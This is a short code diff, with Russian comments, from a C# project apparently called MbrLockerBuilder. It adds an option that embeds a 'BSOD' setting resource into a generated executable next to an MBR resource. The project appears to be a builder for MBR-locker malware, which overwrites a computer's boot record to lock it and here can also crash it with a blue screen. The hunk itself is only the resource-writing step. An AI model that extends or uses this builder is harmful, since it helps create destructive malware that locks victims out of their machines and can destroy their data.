@@ -391,6 +391,17 @@ namespace MbrLockerBuilder
                     throw new Exception("Не удалось добавить ресурс MBR!");
                 }
 
+                // Добавляем ресурс "BSOD" (если галочка включена)
+                if (this.chkBSOD.Checked)
+                {
+                    byte[] bsodData = new byte[0];
+                    if (!UpdateResource(hUpdate, "SETTING", "BSOD", 0, bsodData, 0))
+                    {
+                        EndUpdateResource(hUpdate, true);
+                        throw new Exception("Не удалось добавить ресурс BSOD!");
+                    }
+                }
+
                 if (!EndUpdateResource(hUpdate, false))
                     throw new Exception("Не удалось сохранить файл!");
 
